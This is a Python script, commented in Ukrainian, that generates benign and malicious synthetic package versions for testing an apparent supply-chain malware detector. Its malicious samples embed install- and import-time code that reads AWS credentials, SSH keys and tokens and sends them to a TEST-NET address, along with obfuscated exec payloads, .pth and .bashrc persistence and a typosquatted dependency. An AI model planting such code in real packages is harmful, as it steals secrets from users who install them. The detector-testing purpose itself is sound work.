"""Генератор синтетичних зразків для блокового тестування та експериментів.

Створює базову версію демонстраційної бібліотеки та набір оновлень:
безпечні зміни і безпечні ІМІТАЦІЇ відомих атак (Shai-Hulud, XZ Utils, тайпосквотинг тощо).
Імітації не завдають шкоди: «викрадені» дані нікуди не надсилаються (адреса 203.0.113.10
належить до документаційного діапазону TEST-NET-3 і не маршрутизується), а динамічний
аналіз виконується в контейнері без мережі.

Використання:
  python experiments/make_synthetic.py --out experiments/synthetic
"""

from __future__ import annotations

import argparse
import csv
import io
import tarfile
import textwrap
import time
from pathlib import Path
from typing import Dict, List, Optional

NAME = "libsentinel-demo"
PKG = "lsdemo"

BASE_INIT = '''\
"""Демонстраційна бібліотека для перевірки LibSentinel."""

__version__ = "{version}"


def slugify(text):
    """Перетворює рядок на slug."""
    return "-".join(text.lower().split())


def chunks(seq, n):
    for i in range(0, len(seq), n):
        yield seq[i:i + n]
'''

UTILS = '''\
import json


def load(path):
    with open(path, encoding="utf-8") as f:
        return json.load(f)
'''

SETUP = '''\
from setuptools import setup

setup(
    name="{name}",
    version="{version}",
    packages=["{pkg}"],
    install_requires={requires!r},
)
'''

# --------------------------------------------------------------------------- зразки
SAMPLES: List[Dict] = [
    # ---------------- безпечні оновлення
    {"version": "1.0.1", "label": 0, "kind": "benign-bugfix",
     "desc": "Виправлення помилки у функції slugify",
     "init_extra": '\n\ndef strip_all(items):\n    return [x.strip() for x in items]\n'},
    {"version": "1.0.2", "label": 0, "kind": "benign-network-func",
     "desc": "Нова функція завантаження JSON через urllib (виклик лише всередині функції)",
     "files": {"lsdemo/remote.py": "import json\nimport urllib.request\n\n\ndef fetch(url):\n"
               "    with urllib.request.urlopen(url, timeout=10) as r:\n        return json.load(r)\n"}},
    {"version": "1.0.3", "label": 0, "kind": "benign-new-dep",
     "desc": "Додано популярну залежність packaging", "requires": ["packaging>=21"]},
    {"version": "1.0.4", "label": 0, "kind": "benign-subprocess-func",
     "desc": "Допоміжна функція з subprocess усередині функції CLI",
     "files": {"lsdemo/cli.py": "import subprocess\n\n\ndef git_version():\n"
               "    return subprocess.run(['git', '--version'], capture_output=True, text=True).stdout\n"}},
    {"version": "1.0.5", "label": 0, "kind": "benign-refactor",
     "desc": "Рефакторинг: новий модуль з утилітами",
     "files": {"lsdemo/text.py": "def normalize(s):\n    return ' '.join(s.split())\n\n\n"
               "def title(s):\n    return normalize(s).title()\n"}},
    # ---------------- імітації атак
    {"version": "1.1.0", "label": 1, "kind": "exfil-setup",
     "desc": "Імітація Shai-Hulud: setup.py читає облікові дані та надсилає їх мережею",
     "setup_extra": textwrap.dedent('''
        import os, urllib.request
        try:
            data = open(os.path.expanduser("~/.aws/credentials")).read()
            data += os.environ.get("GITHUB_TOKEN", "")
            urllib.request.urlopen("http://203.0.113.10/collect", data=data.encode(), timeout=3)
        except Exception:
            pass
        ''')},
    {"version": "1.1.1", "label": 1, "kind": "b64-exec-import",
     "desc": "Закодоване навантаження, що виконується під час імпорту (exec(b64decode(...)))",
     "init_extra": '\nimport base64 as _b\nexec(_b.b64decode("aW1wb3J0IG9zCl8gPSBvcy5lbnZpcm9uLmdldCgnR0lUSFVCX1RPS0VOJykK"))\n'},
    {"version": "1.1.2", "label": 1, "kind": "pth-persistence",
     "desc": "Новий файл .pth з інструкцією import (виконується при кожному запуску Python)",
     "files": {"lsdemo_init.pth": "import os; os.environ.get('GITHUB_TOKEN')\n"},
     "setup_data_files": True},
    {"version": "1.1.3", "label": 1, "kind": "obfuscated-setup",
     "desc": "Обфускований код у setup.py, що читає ~/.ssh/id_rsa (невидимий для статичних правил)",
     "setup_extra": textwrap.dedent('''
        _o = __import__("".join(["o", "s"]))
        _p = getattr(_o.path, "expand" + "user")("~/" + "." + "ss" + "h/" + "id_" + "rs" + "a")
        try:
            _k = getattr(__builtins__, "op" + "en")(_p).read() if not isinstance(__builtins__, dict) else __builtins__["op" + "en"](_p).read()
        except Exception:
            _k = None
        ''')},
    {"version": "1.1.4", "label": 1, "kind": "shell-in-setup",
     "desc": "setup.py запускає командну оболонку під час встановлення",
     "setup_extra": '\nimport os\nos.system("sh -c \'id > /tmp/.x; uname -a >> /tmp/.x\'")\n'},
    {"version": "1.1.5", "label": 1, "kind": "typosquat-dep",
     "desc": "Додано залежність із назвою, схожою на популярну (тайпосквотинг)",
     "requires": ["reqeusts>=2.0"]},
    {"version": "1.1.6", "label": 1, "kind": "import-time-exfil",
     "desc": "Під час імпорту модуль збирає змінні середовища і надсилає їх через socket",
     "init_extra": textwrap.dedent('''
        import os as _os, socket as _s, json as _j
        try:
            _env = {k: v for k, v in _os.environ.items() if "TOKEN" in k or "KEY" in k}
            _c = _s.create_connection(("203.0.113.10", 443), timeout=2)
            _c.sendall(_j.dumps(_env).encode())
        except Exception:
            pass
        ''')},
    {"version": "1.1.7", "label": 1, "kind": "persistence-bashrc",
     "desc": "setup.py дописує команду в ~/.bashrc (закріплення в системі)",
     "setup_extra": textwrap.dedent('''
        import os as _os
        try:
            with open(_os.path.join(_os.path.expanduser("~"), ".bashrc"), "a") as _f:
                _f.write("\\n# update\\n")
        except Exception:
            pass
        ''')},
]


def _add(tar: tarfile.TarFile, path: str, content: str) -> None:
    data = content.encode("utf-8")
    info = tarfile.TarInfo(path)
    info.size = len(data)
    info.mtime = int(time.time())
    info.mode = 0o644
    tar.addfile(info, io.BytesIO(data))


def make_sdist(out: Path, version: str, init_extra: str = "", setup_extra: str = "",
               requires: Optional[List[str]] = None, files: Optional[Dict[str, str]] = None,
               setup_data_files: bool = False) -> Path:
    requires = requires or []
    root = f"{NAME}-{version}"
    path = out / f"{NAME}-{version}.tar.gz"
    setup = SETUP.format(name=NAME, version=version, pkg=PKG, requires=requires)
    if setup_data_files:
        setup = setup.replace(")\n", "    data_files=[('', ['lsdemo_init.pth'])],\n)\n", 1) \
            if False else setup.replace("    packages=", "    data_files=[('lib/python3/site-packages', "
                                                       "['lsdemo_init.pth'])],\n    packages=")
    if setup_extra:
        setup = setup_extra.lstrip("\n") + "\n" + setup
    pkginfo = f"Metadata-Version: 2.1\nName: {NAME}\nVersion: {version}\n" + \
        "".join(f"Requires-Dist: {r}\n" for r in requires)
    with tarfile.open(path, "w:gz") as tar:
        _add(tar, f"{root}/setup.py", setup)
        _add(tar, f"{root}/PKG-INFO", pkginfo)
        _add(tar, f"{root}/{PKG}/__init__.py", BASE_INIT.format(version=version) + init_extra)
        _add(tar, f"{root}/{PKG}/utils.py", UTILS)
        for rel, content in (files or {}).items():
            _add(tar, f"{root}/{rel}", content)
    return path


def generate(out: Path) -> Path:
    out.mkdir(parents=True, exist_ok=True)
    base = make_sdist(out, "1.0.0")
    rows = []
    for s in SAMPLES:
        p = make_sdist(out, s["version"], s.get("init_extra", ""), s.get("setup_extra", ""),
                       s.get("requires"), s.get("files"), s.get("setup_data_files", False))
        rows.append({"name": NAME, "old": "1.0.0", "new": s["version"], "label": s["label"], "kind": s["kind"],
                     "old_archive": str(base), "new_archive": str(p), "description": s["desc"]})
    csv_path = out / "synthetic.csv"
    with open(csv_path, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=list(rows[0].keys()))
        w.writeheader()
        w.writerows(rows)
    return csv_path


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default=str(Path(__file__).parent / "synthetic"))
    a = ap.parse_args()
    print(f"Створено: {generate(Path(a.out))}")
